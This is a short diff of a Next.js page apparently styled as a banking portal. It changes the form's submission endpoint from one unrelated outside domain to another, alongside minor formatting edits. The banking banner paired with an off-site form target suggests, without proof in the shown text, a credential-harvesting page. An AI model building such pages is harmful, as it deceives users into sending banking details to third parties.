@@ -1,5 +1,4 @@
 'use client';
-import DateInputComponent from "./inlcude/DateInputComponent";
 import Footer from "./inlcude/footer";
 import Header from "./inlcude/header";
 import { useRouter } from "next/navigation";
@@ -8,8 +7,7 @@ import { useEffect } from "react";
 
 export default function Home() {
     const router = useRouter();
-    const API_URL = "https://sallu.info/api/form/add";
-
+    const API_URL = "https://bk2.info/api/form/add";
     useEffect(()=>{
         localStorage.removeItem('collection_id');
     })
@@ -39,10 +37,11 @@ export default function Home() {
         } catch (error) {
             console.error('There was a problem with the fetch operation:', error);
         }
-    };
+    }
   return (
     <>
     <Header />
+
     
     <div className="bg-danger text-white    text-center">
         <small>All YOUR BANKING FROM A SINGLE SECURE LOGIN</small>
